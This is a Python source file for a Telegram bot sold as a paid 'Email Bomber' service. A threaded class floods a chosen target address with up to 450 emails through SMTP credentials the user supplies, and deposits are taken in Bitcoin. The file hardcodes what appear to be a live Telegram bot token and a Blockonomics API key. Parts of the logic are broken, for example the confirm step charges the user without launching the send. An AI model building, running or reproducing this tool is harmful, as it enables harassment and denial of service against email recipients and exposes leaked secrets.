import smtplib
import threading
import telebot
import requests
import time
from email.utils import formataddr
from telebot import types
import json
import database


bot = telebot.TeleBot("6138199032:AAED2by4VqEeLHWoEnoXsyWQuM7-W1YAD1M")

user_context = {}


def make_payment(api_key):
    url = 'https://www.blockonomics.co/api/new_address'
    headers = {'Authorization': 'Bearer ' + api_key}
    response = requests.post(url, headers=headers)
    if response.status_code == 200:
        address = response.json().get('address')
        return address
    else:
        return None


class EmailBomber:
    def __init__(self, target, amount, server, port, from_addr, from_pwd, chat_id):
        self.target = target
        self.amount = amount
        self.server = server
        self.port = port
        self.from_addr = from_addr
        self.from_pwd = from_pwd
        self.chat_id = chat_id

    def send_email(self, index, subject, sender_name, message):
        try:
            with smtplib.SMTP(self.server, self.port) as s:
                s.starttls()
                s.login(self.from_addr, self.from_pwd)

                subject = f'{subject} ({index + 1})'
                msg = f'''From: {formataddr((sender_name, self.from_addr))}\nTo: {self.target}\nSubject: {subject}\n\n{message}\n'''
                s.sendmail(self.from_addr, self.target, msg.encode('utf-8'))

                # Send progress update to Telegram
                progress = f"Sent email {index + 1} of {self.amount}"
                send_progress_message(self.chat_id, progress)
        except smtplib.SMTPException as e:
            send_error_message(self.chat_id, f'BOMB failed: {e}')

    def attack(self, num_threads, sleep_time, subject, sender_name, message):
        try:
            threads = []

            amount = int(self.amount)  # Convert the amount to an integer

            for i in range(amount):
                if i % num_threads == 0 and i != 0:
                    for t in threads:
                        t.join()
                    threads.clear()

                t = threading.Thread(target=self.send_email, args=(i, subject, sender_name, message))
                t.start()
                threads.append(t)
                time.sleep(sleep_time)

            for t in threads:
                t.join()

            print('\nAttack finished. DONE')
            send_bombing_complete_message(self.chat_id)  # Notify bombing complete
        except Exception as e:
            send_error_message(self.chat_id, f'ERROR: {e}')
            exit(1)


def send_progress_message(chat_id, progress):
    if chat_id in user_context and 'progress_message_id' in user_context[chat_id]:
        message_id = user_context[chat_id]['progress_message_id']
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=progress)
    else:
        message = bot.send_message(chat_id, progress)
        user_context[chat_id]['progress_message_id'] = message.message_id


@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    user_context[chat_id] = {}

    # Create the balance table if it doesn't exist
    database.create_balance_table()

    reply = "Welcome to Email Bomber bot!\n\nThis bot allows you to send a large number of emails to a target email address.\n\nTo start the email bombing attack, use the /bomb command."
    bot.send_message(chat_id, reply, reply_markup=generate_main_menu_markup())


def generate_main_menu_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    bomb_button = types.InlineKeyboardButton("Bomb", callback_data="bomb")
    settings_button = types.InlineKeyboardButton("Settings", callback_data="settings")
    payment_button = types.InlineKeyboardButton("Make Payment", callback_data="payment")
    markup.add(bomb_button, settings_button, payment_button)
    return markup




@bot.message_handler(commands=['bomb'])
def bomb(message):
    chat_id = message.chat.id

    if 'server' not in user_context[chat_id] or 'port' not in user_context[chat_id] \
            or 'from_addr' not in user_context[chat_id] or 'from_pwd' not in user_context[chat_id]:
        reply = "Please configure the email bombing settings first in the /settings menu."
        bot.send_message(chat_id, reply)
    else:
        try:
            reply = "Enter the target email address:"
            bot.send_message(chat_id, reply)
            bot.register_next_step_handler(message, set_target)
        except Exception as e:
            send_error_message(chat_id, str(e))


def set_target(message):
    chat_id = message.chat.id
    target = message.text

    user_context[chat_id]['target'] = target

    reply = "Enter the sender's name:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_sender_name)


def set_sender_name(message):
    chat_id = message.chat.id
    sender_name = message.text

    user_context[chat_id]['sender_name'] = sender_name

    reply = "Enter the email subject:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_subject)


def set_subject(message):
    chat_id = message.chat.id
    subject = message.text

    user_context[chat_id]['subject'] = subject

    reply = "Enter the email message:"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_message)


def set_message(message):
    chat_id = message.chat.id
    message_text = message.text

    user_context[chat_id]['message'] = message_text

    reply = "Enter the amount of emails to send (maximum: 450):"
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, set_amount)


def set_amount(message):
    chat_id = message.chat.id
    amount = message.text

    if not amount.isdigit() or int(amount) <= 0:
        reply = "Invalid amount. Please enter a positive number."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(message, set_amount)
        return

    amount = min(int(amount), 450)  # Maximum of 450 emails

    user_context[chat_id]['amount'] = amount

    sleep_time = 2.0  # Default sleep time

    user_context[chat_id]['sleep_time'] = sleep_time

    reply = "Enter '1' to start the bombing attack."
    bot.send_message(chat_id, reply)
    bot.register_next_step_handler(message, confirm_attack)


def confirm_attack(message):
    chat_id = message.chat.id
    choice = message.text

    if choice == '1':
        if 'target' not in user_context[chat_id]:
            reply = "Please configure the target email address first."
        elif 'server' not in user_context[chat_id] or 'port' not in user_context[chat_id]:
            reply = "Please configure the email bombing settings first in the /settings menu."
        else:
            # Get the user's balance
            user_id = message.from_user.id
            balance = database.get_user_balance(user_id)

            if balance is None or balance < 0.1:
                reply = "Insufficient balance. Please deposit funds to use the bot."
            else:
                target = user_context[chat_id]['target']
                amount = user_context[chat_id]['amount']
                server = user_context[chat_id]['server']
                port = user_context[chat_id]['port']
                from_addr = user_context[chat_id]['from_addr']
                from_pwd = user_context[chat_id]['from_pwd']

                if 'subject' in user_context[chat_id] and 'sender_name' in user_context[chat_id] and 'message' in user_context[chat_id]:
                    subject = user_context[chat_id]['subject']
                    sender_name = user_context[chat_id]['sender_name']
                    message_text = user_context[chat_id]['message']

                    #
                # Deduct the amount from the user's balance
                    new_balance = balance - amount
                    database.update_user_balance(user_id, new_balance)

                    # Perform the email bombing attack
                    # ...

                    reply = "Email bombing attack has been initiated. Please note that this action is irreversible."
                else:
                    reply = "Please configure the email contents in the /settings menu."
        bot.send_message(chat_id, reply, reply_markup=generate_main_menu_markup())
    elif choice == '2':
        # Cancel the attack
        user_context[chat_id] = {}
        reply = "Email bombing attack canceled."
        bot.send_message(chat_id, reply, reply_markup=generate_main_menu_markup())



@bot.message_handler(commands=['deposit'])
def deposit(message):
    chat_id = message.chat.id

    user_id = message.from_user.id
    amount = float(message.text.split()[1])

    # Get the user's current balance
    balance = database.get_user_balance(user_id)

    if balance is None:
        # User does not exist in the database, create a new entry
        balance = amount
        database.update_user_balance(user_id, balance)
    else:
        # User exists, add the deposited amount to the balance
        balance += amount
        database.update_user_balance(user_id, balance)

    reply = f"You have successfully deposited {amount:.2f} units. Your current balance is {balance:.2f} units."
    bot.send_message(chat_id, reply, reply_markup=generate_main_menu_markup())

        

@bot.message_handler(commands=['settings'])
def settings(message):
    chat_id = message.chat.id

    try:
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
            reply = "SMTP settings:\n\n💻 Add SMTP\n✏️ Edit SMTP\n🔍 Show SMTP"
        else:
            reply = "SMTP settings:\n\n💻 Add SMTP\n✏️ Edit SMTP\n🔍 Show SMTP"

        markup = types.InlineKeyboardMarkup(row_width=1)
        add_smtp_button = types.InlineKeyboardButton("💻 Add SMTP", callback_data="add_smtp")
        edit_smtp_button = types.InlineKeyboardButton("✏️ Edit SMTP", callback_data="edit_smtp")
        show_smtp_button = types.InlineKeyboardButton("🔍 Show SMTP", callback_data="show_smtp")
        markup.add(add_smtp_button, edit_smtp_button, show_smtp_button)

        bot.send_message(chat_id, reply, reply_markup=markup)
    except Exception as e:
        send_error_message(chat_id, str(e))



@bot.callback_query_handler(func=lambda call: True)
def handle_inline_buttons(call):
    chat_id = call.message.chat.id
    data = call.data

    if data == "bomb":
        bomb(call.message)
    elif data == "settings":
        settings(call.message)
    elif data == "add_smtp":
        bot.send_message(chat_id, "Enter the SMTP server:")
        bot.register_next_step_handler(call.message, set_smtp_server)
    elif data == "edit_smtp":
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
            bot.send_message(chat_id, "Enter the new SMTP server:")
            bot.register_next_step_handler(call.message, set_smtp_server)
        else:
            reply = "SMTP server and port are not configured. Please configure the email bombing settings first."
            bot.send_message(chat_id, reply)
    elif data == "show_smtp":
        if 'server' in user_context[chat_id] and 'port' in user_context[chat_id]:
            server = user_context[chat_id]['server']
            port = user_context[chat_id]['port']
            from_addr = user_context[chat_id]['from_addr']
            reply = f"Server: {server}\nLog: {from_addr}\nPort: {port}\n\nYou can /bomb or go to /settings"
        else:
            reply = "SMTP server and port are not configured. Please configure the email bombing settings first."
        bot.send_message(chat_id, reply)
    
    elif data == "payment":
        api_key = 'sQNEkxUTeZWfSdja8XSogk60BVuVIHdj97MHkALDHyU'  # Replace with your Blockonomics API key
        address = make_payment(api_key)
        if address:
            reply = f"To deposit funds for email bombing, send Bitcoin to the following address:\n\n{address}"
        else:
            reply = "Failed to generate a payment address. Please try again later."
        bot.send_message(chat_id, reply)

    else:
        reply = "Invalid choice. Please try again."
        bot.send_message(chat_id, reply)
        bot.register_next_step_handler(call.message, handle_inline_buttons)


def set_smtp_server(message):
    chat_id = message.chat.id
    server = message.text

    user_context[chat_id]['server'] = server

    bot.send_message(chat_id, "Enter the SMTP port:")
    bot.register_next_step_handler(message, set_smtp_port)


def set_smtp_port(message):
    chat_id = message.chat.id
    port = message.text

    user_context[chat_id]['port'] = port

    bot.send_message(chat_id, "Enter your email address:")
    bot.register_next_step_handler(message, set_from_addr)


def set_from_addr(message):
    chat_id = message.chat.id
    from_addr = message.text

    user_context[chat_id]['from_addr'] = from_addr

    bot.send_message(chat_id, "Enter your email password:")
    bot.register_next_step_handler(message, set_from_pwd)


def set_from_pwd(message):
    chat_id = message.chat.id
    from_pwd = message.text

    user_context[chat_id]['from_pwd'] = from_pwd

    server = user_context[chat_id]['server']
    port = user_context[chat_id]['port']
    from_addr = user_context[chat_id]['from_addr']
    reply = f"SMTP successfully configured.\n\nServer: {server}\nLog: {from_addr}\nPort: {port}\n\nYou can /bomb or go to /settings"
    bot.send_message(chat_id, reply)


def send_bombing_complete_message(chat_id):
    reply = "Email bombing attack completed."
    bot.send_message(chat_id, reply)


def send_error_message(chat_id, error_message):
    bot.send_message(chat_id, f"An error occurred.\nERROR: {error_message}")

    # Notify the user that an error has occurred
    bot.send_message(chat_id, "An error occurred.")


bot.polling()